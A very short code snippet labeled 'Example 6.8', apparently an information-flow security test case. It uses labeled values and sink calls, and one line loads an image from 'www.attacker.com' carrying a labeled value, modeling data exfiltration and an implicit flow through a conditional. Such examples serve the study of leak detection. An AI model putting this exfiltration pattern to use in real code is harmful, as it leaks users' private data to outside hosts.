// Example 6.8

h = lbl(true);
sink('Sink', '', imgl("www.attacker.com") + imgh(lbl('w')));
if (h) {
	sink('Sink', '', imgh(lbl('source')));
}

